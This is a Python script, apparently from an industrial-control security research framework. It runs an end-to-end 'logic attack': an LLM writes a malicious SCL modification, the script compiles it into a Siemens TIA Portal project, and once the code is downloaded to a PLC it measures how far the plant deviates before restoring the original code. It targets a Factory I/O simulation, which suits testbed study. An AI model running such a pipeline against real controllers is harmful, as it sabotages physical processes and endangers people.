"""
run_logic_attack.py — Full end-to-end logic attack pipeline.

Workflow:
  1. Connect to PLC, verify system is running normally
  2. Observe BASELINE behavior (record tag values over N seconds)
  3. LLM generates adversarial SCL modification
  4. Deploy modified SCL to TIA Portal (compile)
  5. User downloads modified code to PLC from TIA Portal UI
  6. Observe POST-ATTACK behavior (system should malfunction)
  7. Restore original SCL to TIA Portal (compile)
  8. User downloads original code to PLC
  9. Save all artifacts (baseline, attack, observations, diffs)

Prerequisites:
  - PLC connected (192.168.0.1) and in RUN mode
  - Factory I/O scene running
  - TIA Portal V17 open with cpsforge_tiaportal project

Usage:
  py -3 scripts/run_logic_attack.py --scene level_control --context full
  py -3 scripts/run_logic_attack.py --scene level_control --context minimal --baseline-steps 20 --attack-steps 40
"""

import argparse
import json
import logging
import struct
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cpsforge.attacker.logic_mitm import LogicMITMAttacker, _BLOCK_NAMES, _SCL_NAMES
from cpsforge.context_builder.schema import ContextLevel
from cpsforge.core.config import ConfigLoader
from cpsforge.observation.history_buffer import HistoryBuffer
from cpsforge.observation.phase_inference import PhaseInferenceEngine
from cpsforge.scenes.factory import load_scene

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("run_logic_attack")

# ──────────────────────────────────────────────────────────────────
# PLC tag reading helpers (standalone, no PlcClient dependency)
# ──────────────────────────────────────────────────────────────────

def read_tag(client, tag) -> Any:
    """Read a single tag from the PLC via snap7."""
    address = tag.address
    parts = address.split(",")
    db_num = int(parts[0].replace("DB", ""))
    type_offset = parts[1]

    if type_offset.startswith("REAL"):
        offset = int(type_offset[4:])
        data = client.db_read(db_num, offset, 4)
        return round(struct.unpack(">f", data)[0], 4)
    elif type_offset.startswith("DINT"):
        offset = int(type_offset[4:])
        data = client.db_read(db_num, offset, 4)
        return struct.unpack(">i", data)[0]
    elif type_offset.startswith("BOOL"):
        # BOOL2.0 → byte=2, bit=0
        byte_bit = type_offset[4:].split(".")
        offset = int(byte_bit[0])
        bit = int(byte_bit[1]) if len(byte_bit) > 1 else 0
        data = client.db_read(db_num, offset, 1)
        return bool(data[0] & (1 << bit))
    elif type_offset.startswith("X"):
        byte_bit = type_offset[1:].split(".")
        offset = int(byte_bit[0])
        bit = int(byte_bit[1])
        data = client.db_read(db_num, offset, 1)
        return bool(data[0] & (1 << bit))
    else:
        offset = int("".join(c for c in type_offset if c.isdigit()))
        data = client.db_read(db_num, offset, 4)
        return data.hex()


def read_all_tags(client, scene) -> Dict[str, Any]:
    """Read all tags from the PLC for a scene."""
    values = {}
    for tag in scene.profile.tags:
        try:
            values[tag.name] = read_tag(client, tag)
        except Exception as exc:
            values[tag.name] = f"ERROR: {exc}"
    return values


def observe_loop(client, scene, n_steps: int, poll_ms: int = 500,
                 label: str = "") -> List[Dict[str, Any]]:
    """Poll PLC for n_steps and return observations."""
    observations = []
    for step in range(n_steps):
        t0 = time.monotonic()
        obs = {
            "step": step,
            "timestamp": datetime.now().isoformat(),
        }
        for tag in scene.profile.tags:
            try:
                obs[tag.name] = read_tag(client, tag)
            except Exception:
                obs[tag.name] = None
        observations.append(obs)

        if step % 10 == 0 or step == n_steps - 1:
            # Print a few key tags for progress
            key_vals = {k: v for k, v in obs.items()
                        if k not in ("step", "timestamp") and v is not None}
            # Show at most 5 tags
            preview = dict(list(key_vals.items())[:5])
            logger.info("[%s] Step %d/%d: %s", label, step + 1, n_steps, preview)

        elapsed = (time.monotonic() - t0) * 1000.0
        sleep_ms = max(0, poll_ms - elapsed)
        if sleep_ms > 0:
            time.sleep(sleep_ms / 1000.0)

    return observations


def print_tag_snapshot(values: Dict[str, Any], title: str = "PLC State"):
    """Pretty-print current tag values."""
    print(f"\n{'─' * 50}")
    print(f"  {title}")
    print(f"{'─' * 50}")
    for name, val in sorted(values.items()):
        if isinstance(val, float):
            print(f"  {name:30s} = {val:10.4f}")
        else:
            print(f"  {name:30s} = {val}")
    print(f"{'─' * 50}")


def compare_observations(baseline: List[Dict], post_attack: List[Dict],
                          key_tags: Optional[List[str]] = None) -> Dict[str, Any]:
    """Compare baseline vs post-attack observations.

    Returns stats about each tag: mean before/after, max deviation, etc.
    """
    all_tags = set()
    for obs in baseline + post_attack:
        all_tags.update(k for k in obs.keys() if k not in ("step", "timestamp"))

    if key_tags:
        all_tags = all_tags & set(key_tags)

    comparison = {}
    for tag in sorted(all_tags):
        base_vals = [obs.get(tag) for obs in baseline if isinstance(obs.get(tag), (int, float))]
        attack_vals = [obs.get(tag) for obs in post_attack if isinstance(obs.get(tag), (int, float))]

        if not base_vals or not attack_vals:
            continue

        base_mean = sum(base_vals) / len(base_vals)
        attack_mean = sum(attack_vals) / len(attack_vals)
        deviation = abs(attack_mean - base_mean)

        comparison[tag] = {
            "baseline_mean": round(base_mean, 4),
            "attack_mean": round(attack_mean, 4),
            "deviation": round(deviation, 4),
            "pct_change": round(deviation / max(abs(base_mean), 0.001) * 100, 1),
            "baseline_min": round(min(base_vals), 4),
            "baseline_max": round(max(base_vals), 4),
            "attack_min": round(min(attack_vals), 4),
            "attack_max": round(max(attack_vals), 4),
        }

    return comparison


# ──────────────────────────────────────────────────────────────────
# Main pipeline
# ──────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Full logic attack pipeline")
    parser.add_argument("--scene", default="level_control", help="Scene name")
    parser.add_argument("--context", default="full", choices=["minimal", "partial", "full"])
    parser.add_argument("--baseline-steps", type=int, default=30,
                        help="Observation steps for baseline (x500ms)")
    parser.add_argument("--attack-steps", type=int, default=60,
                        help="Observation steps after attack (x500ms)")
    parser.add_argument("--poll-ms", type=int, default=500, help="Polling interval ms")
    parser.add_argument("--output-dir", default="data/raw", help="Output directory")
    parser.add_argument("--no-restore", action="store_true",
                        help="Skip restoration (for debugging)")
    args = parser.parse_args()

    run_id = f"logic_{uuid.uuid4().hex[:8]}"
    run_dir = Path(args.output_dir) / args.scene / run_id
    run_dir.mkdir(parents=True, exist_ok=True)

    events = []
    artifacts = {
        "run_id": run_id,
        "scene": args.scene,
        "context_level": args.context,
        "baseline_steps": args.baseline_steps,
        "attack_steps": args.attack_steps,
        "started_at": datetime.now().isoformat(),
    }

    def log_event(etype, details=None):
        entry = {"timestamp": datetime.now().isoformat(), "event": etype}
        if details:
            entry.update(details)
        events.append(entry)

    # ================================================================
    # PHASE 1: Connect to PLC, verify system is running
    # ================================================================
    print("\n" + "=" * 60)
    print(f"  LOGIC ATTACK PIPELINE — {args.scene} (context={args.context})")
    print(f"  Run ID: {run_id}")
    print("=" * 60)

    import snap7
    plc_client = snap7.client.Client()

    loader = ConfigLoader()
    scene = load_scene(args.scene, loader)
    scene_id = scene.profile.scene_id  # e.g. 12, 19, 20

    print("\n[1/9] Connecting to PLC...")
    try:
        plc_cfg = loader.load_plc()
        plc_client.connect(plc_cfg.host, plc_cfg.rack, plc_cfg.slot)
        logger.info("Connected to PLC at %s", plc_cfg.host)
        log_event("plc_connected", {"host": plc_cfg.host})
    except Exception as exc:
        print(f"ERROR: Cannot connect to PLC: {exc}")
        print("Make sure the PLC is on and connected.")
        return

    # Set ActiveScene in DB_Config (DB2, offset 0, INT) so OB_Main dispatches
    # to the correct scene FB.
    current_scene_raw = plc_client.db_read(2, 0, 2)
    current_scene_id = struct.unpack('>h', current_scene_raw)[0]
    if current_scene_id != scene_id:
        print(f"  Switching ActiveScene: {current_scene_id} → {scene_id}")
        plc_client.db_write(2, 0, struct.pack('>h', scene_id))
        time.sleep(1.0)  # let one scan cycle propagate
    else:
        print(f"  ActiveScene already set to {scene_id}")
    log_event("active_scene_set", {"scene_id": scene_id, "previous": current_scene_id})

    # Read current state
    current = read_all_tags(plc_client, scene)
    print_tag_snapshot(current, f"Current PLC State — {args.scene}")
    log_event("initial_snapshot", current)

    # Quick sanity check: is the system operational?
    print("\nIs Factory I/O running and the system operating normally?")
    resp = input("Press ENTER to continue, or 'q' to quit: ").strip()
    if resp.lower() == 'q':
        plc_client.disconnect()
        return

    # ================================================================
    # PHASE 2: Observe BASELINE behavior
    # ================================================================
    print(f"\n[2/9] Observing baseline ({args.baseline_steps} steps × {args.poll_ms}ms)...")
    log_event("baseline_start")
    baseline_obs = observe_loop(
        plc_client, scene, args.baseline_steps, args.poll_ms, label="BASELINE"
    )
    log_event("baseline_complete", {"steps": len(baseline_obs)})
    print(f"  Recorded {len(baseline_obs)} baseline observations.")

    # ================================================================
    # PHASE 3: LLM generates attack
    # ================================================================
    print(f"\n[3/9] Loading LLM and generating attack...")
    log_event("llm_loading")

    llm_config = loader.load_llm("huggingface")
    from cpsforge.llm.huggingface_provider import HuggingFaceProvider
    llm_provider = HuggingFaceProvider(llm_config)
    llm_provider._ensure_loaded()
    log_event("llm_loaded")

    history = HistoryBuffer(max_size=50)
    phase_engine = PhaseInferenceEngine(args.scene)

    # Feed baseline observations into history for context
    from cpsforge.core.models import PlantSnapshot
    for obs in baseline_obs[-10:]:
        sensors = {}
        actuators = {}
        for tag in scene.profile.tags:
            val = obs.get(tag.name)
            if val is None:
                continue
            if tag.category.value == "sensor":
                sensors[tag.name] = val
            elif tag.category.value == "actuator":
                actuators[tag.name] = val
        snap = PlantSnapshot(
            timestamp=obs["timestamp"],
            scene_name=args.scene,
            run_id=run_id,
            step_id=obs["step"],
            sensors=sensors,
            actuators=actuators,
            setpoints={},
        )
        history.append(snap)

    context_level = ContextLevel(args.context)
    attacker = LogicMITMAttacker(
        scene=scene,
        llm_provider=llm_provider,
        context_level=context_level,
        history=history,
        phase_engine=phase_engine,
    )

    # Get latest snapshot for full context
    snapshot = history.latest() if history.latest() else None

    log_event("llm_generating")
    t0 = time.monotonic()
    attack_result = attacker.generate_attack(snapshot=snapshot)
    gen_time = (time.monotonic() - t0) * 1000.0
    log_event("llm_generated", {
        "latency_ms": round(gen_time, 1),
        "parse_success": attack_result.parse_success,
        "original_matched": attack_result.original_code_matched,
    })

    if not attack_result.success or not attack_result.modification:
        print(f"\n  ATTACK GENERATION FAILED: {attack_result.error}")
        if attack_result.modification:
            mod = attack_result.modification
            print(f"\n  --- LLM's ORIGINAL CODE (did not match) ---")
            print(f"  {mod.original_code}")
            print(f"\n  --- LLM's MODIFIED CODE ---")
            print(f"  {mod.modified_code}")
            print(f"\n  --- REASONING ---")
            print(f"  {mod.reasoning}")
            artifacts["attack_result"] = attack_result.as_dict()
        artifacts["outcome"] = "generation_failed"
        artifacts["error"] = attack_result.error
        _save_all(run_dir, artifacts, events, baseline_obs, [])
        plc_client.disconnect()
        return

    mod = attack_result.modification
    print(f"\n  Attack generated in {gen_time:.0f} ms")
    print(f"  Type:   {mod.modification_type}")
    print(f"  Effect: {mod.expected_effect}")
    print(f"\n  --- ORIGINAL CODE ---")
    print(f"  {mod.original_code}")
    print(f"\n  --- MODIFIED CODE ---")
    print(f"  {mod.modified_code}")
    print(f"\n  --- REASONING ---")
    print(f"  {mod.reasoning}")

    artifacts["attack_result"] = attack_result.as_dict()

    # Apply modification to full SCL
    original_scl = attacker.get_scl_source(args.scene)
    modified_scl = attacker.apply_modification(original_scl, mod)

    if modified_scl is None:
        print("\n  ERROR: Could not apply modification to SCL source")
        artifacts["outcome"] = "apply_failed"
        _save_all(run_dir, artifacts, events, baseline_obs, [])
        plc_client.disconnect()
        return

    # Save modified SCL for inspection
    (run_dir / "modified.scl").write_text(modified_scl, encoding="utf-8")
    (run_dir / "original.scl").write_text(original_scl, encoding="utf-8")
    log_event("modification_applied", {
        "type": mod.modification_type,
        "original_len": len(original_scl),
        "modified_len": len(modified_scl),
    })

    # ================================================================
    # PHASE 4: Deploy modified SCL to TIA Portal
    # ================================================================
    print(f"\n[4/9] Deploying modified SCL to TIA Portal...")
    from cpsforge.plc.tia_openness import TiaOpennessClient

    tia = TiaOpennessClient()
    if not tia.attach():
        print("  ERROR: Cannot attach to TIA Portal. Is it running?")
        artifacts["outcome"] = "tia_attach_failed"
        _save_all(run_dir, artifacts, events, baseline_obs, [])
        plc_client.disconnect()
        return
    log_event("tia_attached")

    # Backup original
    block_name = _BLOCK_NAMES.get(args.scene, f"FB_{args.scene}")
    backup_path = tia.backup_block(block_name)
    if backup_path:
        log_event("backup_created", {"path": str(backup_path)})
        print(f"  Backup: {backup_path}")

    # Deploy
    source_name = _SCL_NAMES.get(args.scene, f"FB_{args.scene}.scl")
    ok, msg = tia.deploy_scl(modified_scl, source_name)
    log_event("deployed", {"success": ok, "message": msg})

    if not ok:
        print(f"  COMPILATION FAILED: {msg}")
        print("  Restoring original...")
        tia.restore_block(block_name, Path("factoryio_scenes") / source_name)
        artifacts["outcome"] = "compilation_failed"
        artifacts["compilation_message"] = msg
        _save_all(run_dir, artifacts, events, baseline_obs, [])
        plc_client.disconnect()
        return

    artifacts["compilation_ok"] = True
    print(f"  Compilation: {msg}")

    # ================================================================
    # PHASE 5: Download to PLC (manual)
    # ================================================================
    print(f"\n[5/9] Download MODIFIED code to PLC")
    print("=" * 60)
    print("  In TIA Portal:")
    print("    1. Online → Download to device")
    print("    2. Start all modules")
    print("  The Factory I/O scene should be running.")
    print("=" * 60)
    input("  Press ENTER when download is complete... ")
    log_event("download_modified_confirmed")

    # ================================================================
    # PHASE 6: Observe POST-ATTACK behavior
    # ================================================================
    print(f"\n[6/9] Observing post-attack behavior ({args.attack_steps} steps × {args.poll_ms}ms)...")
    print("  Watch Factory I/O — the system should behave abnormally!")
    log_event("attack_observation_start")
    attack_obs = observe_loop(
        plc_client, scene, args.attack_steps, args.poll_ms, label="ATTACK"
    )
    log_event("attack_observation_complete", {"steps": len(attack_obs)})
    print(f"  Recorded {len(attack_obs)} post-attack observations.")

    # Show post-attack snapshot
    post_attack_state = read_all_tags(plc_client, scene)
    print_tag_snapshot(post_attack_state, "Post-Attack PLC State")

    # ================================================================
    # PHASE 7: Restore original SCL
    # ================================================================
    if not args.no_restore:
        print(f"\n[7/9] Restoring original SCL to TIA Portal...")
        restore_ok, restore_msg = tia.restore_block(
            block_name, Path("factoryio_scenes") / source_name,
        )
        log_event("restored", {"success": restore_ok, "message": restore_msg})
        print(f"  Restore: {restore_msg}")

        if restore_ok:
            # ================================================================
            # PHASE 8: Download original to PLC
            # ================================================================
            print(f"\n[8/9] Download ORIGINAL code to PLC")
            print("=" * 60)
            print("  In TIA Portal:")
            print("    1. Online → Download to device")
            print("    2. Start all modules")
            print("  This restores normal operation.")
            print("=" * 60)
            input("  Press ENTER when download is complete... ")
            log_event("download_original_confirmed")
    else:
        print("\n[7/9] Skipping restoration (--no-restore)")
        print("[8/9] Skipping (no restore)")

    # ================================================================
    # PHASE 9: Compare & save results
    # ================================================================
    print(f"\n[9/9] Analyzing results...")

    comparison = compare_observations(baseline_obs, attack_obs)
    artifacts["comparison"] = comparison
    artifacts["outcome"] = "success"
    artifacts["finished_at"] = datetime.now().isoformat()

    # Print comparison
    print("\n" + "=" * 60)
    print("  BASELINE vs POST-ATTACK COMPARISON")
    print("=" * 60)
    print(f"  {'Tag':30s} {'Baseline':>12s} {'Attack':>12s} {'Δ':>10s} {'%':>8s}")
    print(f"  {'─' * 30} {'─' * 12} {'─' * 12} {'─' * 10} {'─' * 8}")

    significant_changes = []
    for tag, stats in sorted(comparison.items(), key=lambda x: -x[1]["deviation"]):
        pct = stats["pct_change"]
        marker = " <<<" if pct > 20 else ""
        print(f"  {tag:30s} {stats['baseline_mean']:12.4f} {stats['attack_mean']:12.4f} "
              f"{stats['deviation']:10.4f} {pct:7.1f}%{marker}")
        if pct > 20:
            significant_changes.append(tag)

    if significant_changes:
        print(f"\n  SIGNIFICANT DEVIATIONS (>20%): {', '.join(significant_changes)}")
        artifacts["attack_effective"] = True
        artifacts["significant_tags"] = significant_changes
    else:
        print("\n  No significant deviations detected.")
        artifacts["attack_effective"] = False

    # Save everything
    _save_all(run_dir, artifacts, events, baseline_obs, attack_obs)

    print(f"\n  Artifacts saved to: {run_dir}")
    print(f"  Run ID: {run_id}")

    plc_client.disconnect()
    print("\nDone.")


def _save_all(run_dir: Path, artifacts: Dict, events: List,
              baseline: List, post_attack: List):
    """Save all artifacts to the run directory."""
    run_dir.mkdir(parents=True, exist_ok=True)

    with open(run_dir / "logic_attack.json", "w") as f:
        json.dump(artifacts, f, indent=2, default=str)

    with open(run_dir / "events.jsonl", "w") as f:
        for evt in events:
            f.write(json.dumps(evt, default=str) + "\n")

    if baseline:
        with open(run_dir / "baseline.jsonl", "w") as f:
            for obs in baseline:
                f.write(json.dumps(obs, default=str) + "\n")

    if post_attack:
        with open(run_dir / "post_attack.jsonl", "w") as f:
            for obs in post_attack:
                f.write(json.dumps(obs, default=str) + "\n")


if __name__ == "__main__":
    main()
